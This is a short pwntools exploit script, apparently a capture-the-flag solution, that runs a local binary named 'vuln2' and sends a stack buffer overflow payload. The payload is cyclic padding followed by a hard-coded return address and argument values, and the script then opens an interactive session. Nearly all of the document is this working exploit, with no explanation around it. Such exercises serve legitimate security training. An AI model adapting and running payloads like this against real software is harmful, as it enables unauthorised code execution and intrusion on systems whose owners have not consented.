#! /usr/bin/python3


from pwn import *

HOST = ''
PORT = ''

p = process('./vuln2')

p.sendlineafter(b'Please enter your string: \n', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\xd6\x91\x04\x08\x00\x00\x00\x00\x0d\xf0\xfe\xca\x0d\xf0\x0d\xf0')
# \x13\xf0\x13\xf0\x13\xf0\xfe\xca

# print(p.recvline())
# print(p.recvline())
p.interactive()